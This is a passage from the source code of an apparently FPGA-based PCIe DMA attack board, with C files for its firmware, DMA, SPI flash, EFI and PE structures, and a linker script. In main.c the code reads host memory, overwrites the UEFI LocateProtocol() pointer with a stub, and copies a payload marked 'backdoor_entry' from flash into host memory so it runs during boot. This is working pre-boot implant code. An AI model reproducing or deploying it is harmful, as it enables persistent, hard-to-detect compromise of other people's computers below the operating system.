        (u8 *)&boot_services, sizeof(boot_services)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_read() fails\n");
        return;
    }

    if (!EFI_IS_ADDR_VALID(boot_services))
    {
        xil_printf("Invalid EFI_BOOT_SERVICES address\n");   
        return;
    }

    xil_printf("EFI_BOOT_SERVICES is at 0x%llx\n", boot_services);

    if (mem_read(
        boot_services + OFFSET_OF(struct efi_boot_services, locate_protocol),
        (u8 *)&locate_protocol, sizeof(locate_protocol)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_read() fails\n");
        return;
    }
    
    if (locate_protocol < EFI_MIN_ADDR || locate_protocol > EFI_MAX_ADDR)
    {
        xil_printf("Invalid LocateProtocol() address\n");
        return;
    }

    xil_printf("LocateProtocol() is at 0x%llx\n", locate_protocol);

    xil_printf("Payload stub is at 0x%x\n", stub_addr);

    // stub will spin in the loop untill this value is zero
    if (mem_write(STUB_FUNC_ADDR, (u8 *)&stub_zero, sizeof(stub_zero)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;   
    }

    // write payload stub into the host physical memory
    if (mem_write(stub_addr, m_stub, sizeof(m_stub)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;   
    }

    // patch LocateProtocol() address
    if (mem_write(
        boot_services + OFFSET_OF(struct efi_boot_services, locate_protocol),
        (u8 *)&stub_addr, sizeof(stub_addr)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    xil_printf("Payload is at 0x%x\n", PAYLOAD_ADDR);

    u32 ptr = 0;    

    while (ptr < image_size)
    {
        u8 buff[FLASH_PAGE_SIZE];    
        u32 read_size = MIN(FLASH_PAGE_SIZE, image_size - ptr);

        // read payload from flash
        if (spi_flash_read(
            ROM_SPI_ADDR + ptr, buff, read_size, COMMAND_RANDOM_READ) != XST_SUCCESS)
        {
            xil_printf("ERROR: spi_flash_read() fails\n");
            return;
        }

        read_size = ALIGN_UP(read_size, sizeof(u32));

        // witte payload into the host physical memory
        if (mem_write(PAYLOAD_ADDR + ptr, buff, read_size) != XST_SUCCESS)
        {
            xil_printf("ERROR: mem_write() fails\n");
            return;   
        }

        ptr += FLASH_PAGE_SIZE;
    }

    u64 image_entry = 0;
    u64 conf_addr = PAYLOAD_ADDR + image_conf;

    // read payload image entry from PAYLOAD_CONF
    if (mem_read(
        conf_addr + OFFSET_OF(struct PAYLOAD_CONF, backdoor_entry), 
        (u8 *)&image_entry, sizeof(image_entry)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_read() fails\n");
        return;
    }

    image_entry -= image_base;
    image_entry += PAYLOAD_ADDR;

    xil_printf("Payload entry is at 0x%llx\n", image_entry);

    // pass EFI_SYSTEM_TABLE address to the payload
    if (mem_write(
        conf_addr + OFFSET_OF(struct PAYLOAD_CONF, system_table), 
        (u8 *)&system_table, sizeof(system_table)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    // pass LocateProtocol() address to the payload
    if (mem_write(
        conf_addr + OFFSET_OF(struct PAYLOAD_CONF, locate_protocol), 
        (u8 *)&locate_protocol, sizeof(locate_protocol)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    // resume stub execution
    if (mem_write(STUB_FUNC_ADDR, (u8 *)&image_entry, sizeof(image_entry)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    xil_printf("mode_standalone(): Completed\n");
}

int main(void)
{
    init_platform();

    // initialize UART
    if (init_uart(DEVICE_ID_UART) != XST_SUCCESS)
    {
        xil_printf("ERROR: init_uart() fails\n");
        return -1;
    }

    // initialize GPIO
    if (init_gpio(DEVICE_ID_GPIO) != XST_SUCCESS)
    {
        xil_printf("ERROR: init_gpio() fails\n");
        return -1;
    }

    // initialize SPI flash
    if (spi_flash_initialize() != XST_SUCCESS)
    {
        xil_printf("ERROR: spi_flash_initialize() fails\n");
        return -1;   
    }

    // initialize AXI DMA engine
    if (axi_dma_initialize() != XST_SUCCESS)
    {
        xil_printf("ERROR: axi_dma_initialize() fails\n");
        return -1;
    }

    // check user button state
    if (GPIO_BTN_GET() != 0)
    {
        GPIO_LED_ON();

        // go to the serial controlled mode
        mode_serial();
    }

    GPIO_LED_OFF();

    // go to the autonomous mode
    mode_standalone();

    cleanup_platform();

    return 0;
}

```

`software/application/src/axi_dma.c`:

```c
#include <stdio.h>
#include <stdbool.h>

#include <xil_printf.h>
#include <xil_types.h>
#include <xil_exception.h>
#include <xil_cache.h>
#include <xparameters.h>
#include <xaxidma.h>
#include <xintc.h>

#include "platform_config.h"
#include "axi_dma.h"

// DMA engine instance
static XAxiDma m_AxiDma;

// interrupt controller instance
static XIntc m_Intc;

// user handlers
static AXI_DMA_HANDLER m_handler_rx = NULL;
static AXI_DMA_HANDLER m_handler_tx = NULL;

static int m_queued_tx = 0, m_queued_rx = 0;

static void axi_dma_interrupts_disable(void)
{
    // disable all interrupts
    XAxiDma_IntrDisable(&m_AxiDma, XAXIDMA_IRQ_ALL_MASK, XAXIDMA_DMA_TO_DEVICE);
    XAxiDma_IntrDisable(&m_AxiDma, XAXIDMA_IRQ_ALL_MASK, XAXIDMA_DEVICE_TO_DMA);
}

static void axi_dma_interrupts_enable(void)
{
    // enable all interrupts
    XAxiDma_IntrEnable(&m_AxiDma, XAXIDMA_IRQ_ALL_MASK, XAXIDMA_DMA_TO_DEVICE);
    XAxiDma_IntrEnable(&m_AxiDma, XAXIDMA_IRQ_ALL_MASK, XAXIDMA_DEVICE_TO_DMA);
}

void axi_dma_reset(void)
{
    m_queued_rx = m_queued_tx = 0;
    m_handler_rx = m_handler_tx = NULL;    

    XAxiDma_Reset(&m_AxiDma);

    while (XAxiDma_ResetIsDone(&m_AxiDma) == 0)
    {
        // wait for reset
    }
   
    axi_dma_interrupts_disable();
    axi_dma_interrupts_enable();  
}

void axi_dma_isr_tx(void *Param)
{
    XAxiDma *AxiDma = (XAxiDma *)Param;

    // read pending interrupts
    u32 IrqStatus = XAxiDma_IntrGetIrq(AxiDma, XAXIDMA_DMA_TO_DEVICE);

    // acknowledge pending interrupts
    XAxiDma_IntrAckIrq(AxiDma, IrqStatus, XAXIDMA_DMA_TO_DEVICE);

    if (!(IrqStatus & XAXIDMA_IRQ_ALL_MASK))
    {
        // no interrupt is asserted
        return;
    }

    // check for the error
    if (IrqStatus & XAXIDMA_IRQ_ERROR_MASK)
    {

#ifdef VERBOSE

        xil_printf("isr_dma_tx(): IRQ error\n");
#endif
        // reset DMA engine
        axi_dma_reset();
        return;
    }

    // transmit completed
    if (IrqStatus & (XAXIDMA_IRQ_DELAY_MASK | XAXIDMA_IRQ_IOC_MASK))
    {

#ifdef VERBOSE

        xil_printf("isr_dma_tx(): transmit completed\n");
#endif
        m_queued_tx = 0;

        if (m_handler_tx)
        {
            // call user handler
            m_handler_tx();
            m_handler_tx = NULL;            
        }
    }
}

void axi_dma_isr_rx(void *Param)
{
    XAxiDma *AxiDma = (XAxiDma *)Param;

    // read pending interrupts
    u32 IrqStatus = XAxiDma_IntrGetIrq(AxiDma, XAXIDMA_DEVICE_TO_DMA);

    // acknowledge pending interrupts
    XAxiDma_IntrAckIrq(AxiDma, IrqStatus, XAXIDMA_DEVICE_TO_DMA);

    if (!(IrqStatus & XAXIDMA_IRQ_ALL_MASK))
    {
        // no interrupt is asserted
        return;
    }

    // check for the error
    if (IrqStatus & XAXIDMA_IRQ_ERROR_MASK)
    {

#ifdef VERBOSE

        xil_printf("isr_dma_rx(): IRQ error\n");
#endif
        // reset DMA engine
        axi_dma_reset();
        return;
    }

    if (IrqStatus & (XAXIDMA_IRQ_DELAY_MASK | XAXIDMA_IRQ_IOC_MASK))
    {

#ifdef VERBOSE

        xil_printf("isr_dma_rx(): receive completed\n");
#endif
        m_queued_rx = 0;

        if (m_handler_rx)
        {
            // call user handler
            m_handler_rx();
            m_handler_rx = NULL;            
        }
    }
}

int axi_dma_interrupts_init(XIntc *Intc, XAxiDma *AxiDma)
{   
    // initialize interrupt controller and connect the ISRs
    int Status = XIntc_Initialize(Intc, DEVICE_ID_INTC);
    if (Status != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XIntc_Initialize() fails\n");
#endif
        return XST_FAILURE;
    }

    // register transmit ISR
    if ((Status = XIntc_Connect(Intc, VEC_ID_AXI_DMA_MM2S, axi_dma_isr_tx, AxiDma)) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XIntc_Connect() fails\n");

#endif
        return XST_FAILURE;
    }

    // register receive ISR
    if ((Status = XIntc_Connect(Intc, VEC_ID_AXI_DMA_S2MM, axi_dma_isr_rx, AxiDma)) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XIntc_Connect() fails\n");
#endif
        return XST_FAILURE;
    }

    // start interrupt controller
    if ((Status = XIntc_Start(Intc, XIN_REAL_MODE)) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XIntc_Start() fails\n");
#endif
        return XST_FAILURE;
    }

    // enable interrupts
    XIntc_Enable(Intc, VEC_ID_AXI_DMA_MM2S);
    XIntc_Enable(Intc, VEC_ID_AXI_DMA_S2MM);

    Xil_ExceptionInit();
    Xil_ExceptionRegisterHandler(XIL_EXCEPTION_ID_INT, (Xil_ExceptionHandler)XIntc_InterruptHandler, Intc);
    Xil_ExceptionEnable();

    return XST_SUCCESS;
}

int axi_dma_initialize(void)
{
    m_queued_rx = m_queued_tx = 0;
    m_handler_rx = m_handler_tx = NULL;    

#ifdef VERBOSE

    xil_printf("Initializing DMA engine...\n");

#endif

    XAxiDma_Config *Config = XAxiDma_LookupConfig(DEVICE_ID_AXI_DMA);
    if (Config == NULL)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XAxiDma_LookupConfig() fails\n");
#endif
        return XST_FAILURE;
    }

    XAxiDma_CfgInitialize(&m_AxiDma, Config);

    // check for Scatter-Gather mode
    if (XAxiDma_HasSg(&m_AxiDma))
    {

#ifdef VERBOSE

        xil_printf("ERROR: Scatter-Gather DMA is configured\n");
#endif
        return XST_FAILURE;
    }

#ifdef VERBOSE

    xil_printf("Initializing interrupts controller...\n");

#endif

    // set up interrupt controller
    if (axi_dma_interrupts_init(&m_Intc, &m_AxiDma) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    axi_dma_interrupts_disable();
    axi_dma_interrupts_enable();

    return XST_SUCCESS;
}

int axi_dma_queue_tx(void *buff, u32 size, AXI_DMA_HANDLER handler)
{
    if (m_queued_tx != 0)
    {

#ifdef VERBOSE

        xil_printf("axi_dma_queue_tx() ERROR: Busy\n");
#endif

        return XST_FAILURE;
    }

    m_queued_tx += 1;
    m_handler_tx = handler;    

    // start transmit transfer
    if (XAxiDma_SimpleTransfer(&m_AxiDma, (u32)buff, size, XAXIDMA_DMA_TO_DEVICE) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XAxiDma_SimpleTransfer() fails\n");
#endif

        return XST_FAILURE;
    }

    return XST_SUCCESS;
}

int axi_dma_queue_rx(void *buff, u32 size, AXI_DMA_HANDLER handler)
{
    if (m_queued_rx != 0)
    {

#ifdef VERBOSE

        xil_printf("axi_dma_queue_rx() ERROR: Busy\n");
#endif

        return XST_FAILURE;
    }

    m_queued_rx += 1;
    m_handler_rx = handler;

    // start receive transfer
    if (XAxiDma_SimpleTransfer(&m_AxiDma, (u32)buff, size, XAXIDMA_DEVICE_TO_DMA) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XAxiDma_SimpleTransfer() fails\n");
#endif

        return XST_FAILURE;
    }

    return XST_SUCCESS;
}

bool axi_dma_queued_tx(void)
{
    return m_queued_tx != 0;
}

bool axi_dma_queued_rx(void)
{
    return m_queued_rx != 0;
}

int axi_dma_wait_tx(u32 timeout)
{
    u32 counter = 0;

    while (axi_dma_queued_tx())
    {
        if (timeout != 0)
        {
            // wait with timeout
            if (counter >= timeout)
            {

#ifdef VERBOSE
                xil_printf("axi_dma_wait_tx() ERROR: Timeout occurred\n");
#endif
                // reset DMA engine
                axi_dma_reset();

                return XST_FAILURE;
            }

            counter += 1;
        }
    }

    return XST_SUCCESS;
}

int axi_dma_wait_rx(u32 timeout)
{
    u32 counter = 0;

    while (axi_dma_queued_rx())
    {
        if (timeout != 0)
        {
            // wait with timeout
            if (counter >= timeout)
            {

#ifdef VERBOSE
                xil_printf("axi_dma_wait_rx() ERROR: Timeout occurred\n");
#endif
                // reset DMA engine
                axi_dma_reset();

                return XST_FAILURE;
            }

            counter += 1;
        }
    }

    return XST_SUCCESS;
}

```

`software/application/src/axi_dma.h`:

```h
#ifndef __AXI_DMA_H_
#define __AXI_DMA_H_

typedef void (* AXI_DMA_HANDLER)(void);

void axi_dma_reset(void);

int axi_dma_initialize(void);

int axi_dma_queue_tx(void *buff, u32 size, AXI_DMA_HANDLER handler);
int axi_dma_queue_rx(void *buff, u32 size, AXI_DMA_HANDLER handler);

bool axi_dma_queued_tx(void);
bool axi_dma_queued_rx(void);

int axi_dma_wait_tx(u32 timeout);
int axi_dma_wait_rx(u32 timeout);

#endif

```

`software/application/src/axis_pcie.c`:

```c
#include <stdio.h>
#include <fsl.h>

#include "axis_pcie.h"

u32 axis_pcie_read_config(u32 num)
{
    u32 val;

    getfslx(val, AXIS_PCIE_DEV_ID_CONFIG, FSL_NONBLOCKING);

    // write config space register number
    putfslx(num, AXIS_PCIE_DEV_ID_CONFIG, FSL_DEFAULT);
    putfslx(num, AXIS_PCIE_DEV_ID_CONFIG, FSL_CONTROL);

    // read config space register data
    getfslx(val, AXIS_PCIE_DEV_ID_CONFIG, FSL_DEFAULT);

    return val;
}

```

`software/application/src/axis_pcie.h`:

```h
#ifndef __AXIS_PCIE_H_
#define __AXIS_PCIE_H_

// ID of AXI stream device used to access PCI-E config space
#define AXIS_PCIE_DEV_ID_CONFIG 0

u32 axis_pcie_read_config(u32 num);

#endif

```

`software/application/src/common.h`:

```h
#ifndef __COMMON_H_
#define __COMMON_H_

#define PAGE_SIZE 0x1000

#define ALIGN_UP(_val_, _align_) (((_val_) + ((_align_) - 1)) & ~((_align_) - 1))

#define ALIGN_DOWN(_val_, _align_) ((_val_) & ~((_align_) - 1))

#define MIN(_x_, _y_) (((_x_) < (_y_)) ? (_x_) : (_y_))
#define MAX(_x_, _y_) (((_x_) > (_y_)) ? (_x_) : (_y_))

#define OFFSET_OF(_type_, _field_) ((u32)&(((_type_ *)0)->_field_))

#endif

```

`software/application/src/efi.h`:

```h
#ifndef __EFI_H_
#define __EFI_H_

typedef u64 efi_ptr;

typedef efi_ptr efi_handle;

struct efi_table_header
{
    u64 signature;
    u32 revision;
    u32 header_size;
    u32 crc32;
    u32 reserved;
};

struct efi_system_table
{
    struct efi_table_header hdr;

    efi_ptr firmware_vendor;
    u64 firmware_revision;

    efi_handle console_in_handler;
    efi_ptr con_in;
    
    efi_handle console_out_handler;
    efi_ptr con_out;
    
    efi_handle standard_error_handle;
    efi_ptr std_err;
    
    efi_ptr runtime_services;
    efi_ptr boot_services;
    u64 num_table_entries;
    efi_ptr configuration_table;
};

struct efi_boot_services
{
    struct efi_table_header hdr;

    /* Task Priority Services */
    efi_ptr raise_tpl;
    efi_ptr restore_tpl;

    /* Memory Services */
    efi_ptr allocate_pages;
    efi_ptr free_pages;
    efi_ptr get_memory_map;
    efi_ptr allocate_pool;
    efi_ptr free_pool;

    /* Event & Timer Services */
    efi_ptr create_event;
    efi_ptr set_timer;
    efi_ptr wait_for_event;
    efi_ptr signal_event;
    efi_ptr close_event;
    efi_ptr check_event;

    /* Protocol Handler Services */
    efi_ptr install_protocol_interface;
    efi_ptr reinstall_protocol_interface;
    efi_ptr uninstall_protocol_interface;
    efi_ptr handle_protocol;
    efi_ptr reserved;
    efi_ptr register_protocol_notify;
    efi_ptr locate_handle;
    efi_ptr locate_device_path;
    efi_ptr install_configuration_table;

    /* Image Services */
    efi_ptr load_image;
    efi_ptr start_image;
    efi_ptr exit;
    efi_ptr unload_image;
    efi_ptr exit_boot_services;

    /* Miscellaneous Services */
    efi_ptr get_next_monotonic_count;
    efi_ptr stall;
    efi_ptr set_watchdog_timer;

    /* DriverSupport Services */
    efi_ptr connect_controller;
    efi_ptr disconnect_controller;

    /* Open and Close Protocol Services */
    efi_ptr open_protocol;
    efi_ptr close_protocol;
    efi_ptr open_protocol_information;

    /* Library Services */
    efi_ptr protocols_per_handle;
    efi_ptr locate_handle_buffer;
    efi_ptr locate_protocol;
    efi_ptr install_multiple_protocol_interfaces;
    efi_ptr uninstall_multiple_protocol_interfaces;

    /* 32-bit CRC Services */
    efi_ptr calculate_crc32;

    /* Miscellaneous Services */
    efi_ptr copy_mem;
    efi_ptr set_mem;
};

#endif

```

`software/application/src/efi_image.h`:

```h
#ifndef __PE_IMAGE_H_
#define __PE_IMAGE_H_

// DOS header signature
#define DOS_SIGNATURE 0x5a4d

// NT headers signature
#define PE_SIGNATURE 0x4550

struct dos_header
{
    u16 e_magic;
    u16 e_cblp;
    u16 e_cp;
    u16 e_crlc;
    u16 e_cparhdr;
    u16 e_minalloc;
    u16 e_maxalloc;
    u16 e_ss;
    u16 e_sp;
    u16 e_csum;
    u16 e_ip;
    u16 e_cs;
    u16 e_lfarlc;
    u16 e_ovno;
    u16 e_res[4];
    u16 e_oemid;
    u16 e_oeminfo;
    u16 e_res2[10];
    u32 e_lfanew;
};

struct pe32_file_header
{
    u16 machine;
    u16 num_sections;
    u32 time;
    u32 symtab_offset;
    u32 num_symbols;
    u16 optional_header_size;
    u16 characteristics;
};

/*
    Machine type constants
*/
#define PE32_MACHINE_I386       0x014c
#define PE32_MACHINE_IA64       0x0200
#define PE32_MACHINE_X86_64     0x8664
#define PE32_MACHINE_ARM64      0xaa64

/*
    Subsystem constnts
*/
#define SUBSYSTEM_EFI_APPLICATION           10
#define SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER   11
#define SUBSYSTEM_EFI_RUNTIME_DRIVER        12
#define SUBSYSTEM_EFI_ROM                   13

struct pe32_data_directory
{
    u32 rva;
    u32 size;
};

struct pe64_optional_header
{
    u16 magic;
    u8 major_linker_version;
    u8 minor_linker_version;
    u32 code_size;
    u32 data_size;
    u32 bss_size;
    u32 entry_addr;
    u32 code_base;

    u64 image_base;

    u32 section_alignment;
    u32 file_alignment;
    u16 major_os_version;
    u16 minor_os_version;
    u16 major_image_version;
    u16 minor_image_version;
    u16 major_subsystem_version;
    u16 minor_subsystem_version;
    u32 reserved;
    u32 image_size;
    u32 header_size;
    u32 checksum;
    u16 subsystem;
    u16 dll_characteristics;

    u64 stack_reserve_size;
    u64 stack_commit_size;
    u64 heap_reserve_size;
    u64 heap_commit_size;

    u32 loader_flags;
    u32 num_data_directories;

    /* Data directories */
    struct pe32_data_directory export_table;
    struct pe32_data_directory import_table;
    struct pe32_data_directory resource_table;
    struct pe32_data_directory exception_table;
    struct pe32_data_directory certificate_table;
    struct pe32_data_directory base_relocation_table;
    struct pe32_data_directory debug;
    struct pe32_data_directory architecture;
    struct pe32_data_directory global_ptr;
    struct pe32_data_directory tls_table;
    struct pe32_data_directory load_config_table;
    struct pe32_data_directory bound_import;
    struct pe32_data_directory iat;
    struct pe32_data_directory delay_import_descriptor;
    struct pe32_data_directory com_runtime_header;
    struct pe32_data_directory reserved_entry;
};

struct pe64_nt_headers
{
    /* This is always PE\0\0 */
    u32 signature;

    /* The COFF file header */
    struct pe32_file_header file_header;

    /* The Optional header */
    struct pe64_optional_header optional_header;
};

struct pe32_section_header
{
    char name[8];
    u32 virtual_size;
    u32 virtual_address;
    u32 raw_data_size;
    u32 raw_data_offset;
    u32 relocations_offset;
    u32 line_numbers_offset;
    u16 num_relocations;
    u16 num_line_numbers;
    u32 characteristics;
};

#endif

```

`software/application/src/flash.c`:

```c
#include <stdio.h>
#include <stdbool.h>

#include <xil_printf.h>
#include <xil_types.h>
#include <xparameters.h>
#include <xspi.h>

#include "platform_config.h"
#include "flash.h"

/*
    The following constant defines the slave select signal that is used to
    to select the Flash device on the SPI bus, this signal is typically
    connected to the chip select of the device.
 */
#define SPI_SELECT 0x01

#define READ_WRITE_EXTRA_BYTES 4

// SPI device instance
static XSpi m_Spi;

// read/write buffer
static u8 m_buff_tx[READ_WRITE_EXTRA_BYTES + FLASH_PAGE_SIZE];
static u8 m_buff_rx[READ_WRITE_EXTRA_BYTES + FLASH_PAGE_SIZE + 4];

static int spi_transfer(u8 *buff_tx, u8 *buff_rx, u32 size)
{
    int Status = XST_FAILURE;   

    // start the SPI driver so that the device is enabled
    XSpi_Start(&m_Spi);

    // disable global interrupt to use polled mode operation
    XSpi_IntrGlobalDisable(&m_Spi);    

    if ((Status = XSpi_SetSlaveSelect(&m_Spi, SPI_SELECT)) != XST_SUCCESS) 
    {

#ifdef VERBOSE

        xil_printf("ERROR: XSpi_SetSlaveSelect() fails\n");
#endif
        return XST_FAILURE;
    }

    // perform SPI transfer
    if ((Status = XSpi_Transfer(&m_Spi, buff_tx, buff_rx, size)) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XSpi_Transfer() fails\n");
#endif
        return XST_FAILURE;
    }   

    XSpi_Stop(&m_Spi);

    return XST_SUCCESS;
}

static int spi_flash_get_status(u8 *Val)
{
    int Status = XST_FAILURE;
    
    m_buff_tx[0] = COMMAND_STATUS_READ_1;

    // send SR1 read command
    if ((Status = spi_transfer(m_buff_tx, m_buff_rx, 2)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }   

    if (Val)
    {
        *Val = m_buff_rx[1];
    }

    return XST_SUCCESS;
}

static int spi_flash_wait_ready(void)
{   
    int Status = XST_FAILURE; 

    while (true)
    {
        u8 Val = 0;

        // get status 1 register value
        if ((Status = spi_flash_get_status(&Val)) != XST_SUCCESS)
        {
            return XST_FAILURE;
        }   

        // check if flash is ready to accept next command
        if ((Val & 0x01) == 0) 
        {
            break;
        }
    }

    return XST_SUCCESS;
}

int spi_flash_write_enable(u8 Command)
{
    int Status = XST_FAILURE;

    if ((Status = spi_flash_wait_ready()) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: spi_flash_wait_ready() fails\n");
#endif
        return XST_FAILURE;
    }

    m_buff_tx[0] = Command;
    m_buff_tx[1] = 0;

    // send write enable command
    if ((Status = spi_transfer(m_buff_tx, NULL, 1)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    return XST_SUCCESS;
}

int spi_flash_block_erase(u32 Address)
{
    int Status = XST_FAILURE;    

    if ((Status = spi_flash_wait_ready()) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: spi_flash_wait_ready() fails\n");
#endif
        return XST_FAILURE;
    }

    // prepare sector erase command
    m_buff_tx[0] = COMMAND_BLOCK_ERASE;
    m_buff_tx[1] = (u8)((Address >> 16) & 0xff);
    m_buff_tx[2] = (u8)((Address >> 8) & 0xff);
    m_buff_tx[3] = (u8)((Address >> 0) & 0xff);    

    // send command
    if ((Status = spi_transfer(m_buff_tx, NULL, 4)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    return XST_SUCCESS;
}

int spi_flash_read(u32 Address, u8 *Buff, u32 Size, u8 Command)
{
    int Status = XST_FAILURE;
    u32 DummyBytes = 0;

    if (Size > FLASH_PAGE_SIZE)
    {
        // read size is too large
        return XST_FAILURE;
    }

    if ((Status = spi_flash_wait_ready()) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: spi_flash_wait_ready() fails\n");
#endif
        return XST_FAILURE;
    }
    
    // prepare flash read command
    m_buff_tx[0] = Command;
    m_buff_tx[1] = (u8)((Address >> 16) & 0xff);
    m_buff_tx[2] = (u8)((Address >> 8) & 0xff);
    m_buff_tx[3] = (u8)((Address >> 0) & 0xff);    

    // dummy clock cycles before data available
    if (Command == COMMAND_DUAL_READ) 
    {
        DummyBytes = 2;
    } 
    else if (Command == COMMAND_DUAL_IO_READ) 
    {
        DummyBytes = 1;
    } 
    else if (Command == COMMAND_QUAD_IO_READ) 
    {
        DummyBytes = 3;
    } 
    else if (Command == COMMAND_QUAD_READ) 
    {
        DummyBytes = 4;
    }

    // perform transfer
    if ((Status = spi_transfer(m_buff_tx, m_buff_rx, Size + DummyBytes + READ_WRITE_EXTRA_BYTES)) != XST_SUCCESS) 
    {
        return XST_FAILURE;
    }

    if (Buff)
    {
        // copy data to the caller buffer
        memcpy(Buff, m_buff_rx + DummyBytes + READ_WRITE_EXTRA_BYTES, Size);
    }

    return XST_SUCCESS;
}

int spi_flash_write(u32 Address, u8 *Buff, u32 Size)
{
    int Status = XST_FAILURE;

    if (Size > FLASH_PAGE_SIZE)
    {
        // write size is too large
        return XST_FAILURE;
    }

    if ((Status = spi_flash_wait_ready()) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: spi_flash_wait_ready() fails\n");
#endif
        return XST_FAILURE;
    }

    // prepare flash write command
    m_buff_tx[0] = COMMAND_PAGE_PROGRAM;
    m_buff_tx[1] = (u8)((Address >> 16) & 0xff);
    m_buff_tx[2] = (u8)((Address >> 8) & 0xff);
    m_buff_tx[3] = (u8)((Address >> 0) & 0xff);    

    // copy data from the caller buffer
    memcpy(m_buff_tx + READ_WRITE_EXTRA_BYTES, Buff, Size);    

    // perform transfer
    if ((Status = spi_transfer(m_buff_tx, NULL, Size + READ_WRITE_EXTRA_BYTES)) != XST_SUCCESS) 
    {
        return XST_FAILURE;
    }

    return XST_SUCCESS;
}   

int spi_flash_initialize(void)
{
    int Status = XST_FAILURE;

    // initialize the SPI driver
    if ((Status = XSpi_Initialize(&m_Spi, DEVICE_ID_SPI)) != XST_SUCCESS) 
    {

#ifdef VERBOSE

        xil_printf("ERROR: XSpi_Initialize() fails\n");
#endif
        return XST_FAILURE;
    }        

    // set SPI master mode
    if ((Status = XSpi_SetOptions(&m_Spi, XSP_MASTER_OPTION | XSP_MANUAL_SSELECT_OPTION)) != XST_SUCCESS)
    {

#ifdef VERBOSE

        xil_printf("ERROR: XSpi_SetOptions() fails\n");
#endif
        return XST_FAILURE;  
    }

    return XST_SUCCESS;
}

```

`software/application/src/flash.h`:

```h
#ifndef __FLASH_H_
#define __FLASH_H_

/*
    Number of bytes per page, sector and block in the flash device.
 */
#define FLASH_PAGE_SIZE     0x100
#define FLASH_SECTOR_SIZE   0x1000  // 4Kb
#define FLASH_BLOCK_SIZE    0x10000 // 64Kb

/*
    Definitions of the SPI flash commands.
 */
#define COMMAND_STATUS_WRITE    0x01    // status registers write command
#define COMMAND_STATUS_READ_1   0x05    // SR1 read command
#define COMMAND_STATUS_READ_2   0x35    // SR2 read command
#define COMMAND_STATUS_READ_3   0x33    // SR3 read command
#define COMMAND_PAGE_PROGRAM    0x02    // page program command
#define COMMAND_QUAD_WRITE      0x32    // quad input fast program
#define COMMAND_RANDOM_READ     0x03    // random read command
#define COMMAND_DUAL_READ       0x3B    // dual output fast read
#define COMMAND_DUAL_IO_READ    0xBB    // dual IO fast read
#define COMMAND_QUAD_READ       0x6B    // quad output fast read
#define COMMAND_QUAD_IO_READ    0xEB    // quad IO fast read
#define COMMAND_WRITE_ENABLE    0x06    // write enable command
#define COMMAND_WRITE_DISABLE   0x04    // write disable command
#define COMMAND_SECTOR_ERASE    0x20    // sector erase command
#define COMMAND_BLOCK_ERASE     0xD8    // block erase command
#define COMMAND_BULK_ERASE      0xC7    // bulk erase command

int spi_flash_initialize(void);

int spi_flash_write_enable(u8 Command);
int spi_flash_block_erase(u32 Address);

int spi_flash_read(u32 Address, u8 *Buff, u32 Size, u8 Command);
int spi_flash_write(u32 Address, u8 *Buff, u32 Size);

#endif

```

`software/application/src/lscript.ld`:

```ld
/*******************************************************************/
/*                                                                 */
/* This file is automatically generated by linker script generator.*/
/*                                                                 */
/* Version: 2019.2                                                 */
/*                                                                 */
/* Copyright (c) 2010-2019 Xilinx, Inc.  All rights reserved.      */
/*                                                                 */
/* Description : MicroBlaze Linker Script                           */
/*                                                                 */
/*******************************************************************/

_STACK_SIZE = DEFINED(_STACK_SIZE) ? _STACK_SIZE : 0x400;
_HEAP_SIZE = DEFINED(_HEAP_SIZE) ? _HEAP_SIZE : 0x800;

/* Define Memories in the system */

MEMORY
{
   microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem : ORIGIN = 0x50, LENGTH = 0x1FFB0
   axi_bram_ctrl_0_Mem0 : ORIGIN = 0xC0000000, LENGTH = 0x1000
}

/* Specify the default entry point to the program */

ENTRY(_start)

/* Define the sections, and where they are mapped in memory */

SECTIONS
{
.vectors.reset 0x0 : {
   KEEP (*(.vectors.reset))
} 

.vectors.sw_exception 0x8 : {
   KEEP (*(.vectors.sw_exception))
} 

.vectors.interrupt 0x10 : {
   KEEP (*(.vectors.interrupt))
} 

.vectors.hw_exception 0x20 : {
   KEEP (*(.vectors.hw_exception))
} 

.text : {
   *(.text)
   *(.text.*)
   *(.gnu.linkonce.t.*)
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.init : {
   KEEP (*(.init))
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.fini : {
   KEEP (*(.fini))
} > microblaze_0_local_memory_ilmb_bram_if_cntlr_Mem_microblaze_0_local_memory_dlmb_bram_if_cntlr_Mem

.ctors : {
   __CTOR_LIST__ = .;
   ___CTORS_LIST___ = .;
   KEEP (*crtbegin.o(.ctors))
